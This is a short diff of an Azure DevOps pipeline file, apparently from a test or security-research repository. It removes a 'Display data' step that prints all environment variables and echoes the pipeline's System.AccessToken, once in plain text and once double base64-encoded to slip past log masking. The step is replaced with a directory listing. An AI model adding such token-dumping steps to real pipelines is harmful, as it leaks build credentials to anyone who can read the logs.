@@ -17,17 +17,7 @@ variables:
 steps:
   - download: "nadav-legit.test_pipelines"
   - script: |
-      printenv
-      echo "========================="
-      echo $(System.AccessToken)
-      echo "+++++++++++++++++++++++++"
-      echo $(System.AccessToken) | base64 | base64
-      echo "-------------------------"
-      echo "Url to verify: $(varificationUrl)"
-      echo "verifying the following branch:"
-      echo "$(Build.SourceBranchName)"
-      echo "verifying the following commit:"
-      echo "$(Build.SourceVersionMessage)"
+      ls -laR
     
     
     displayName: Display data
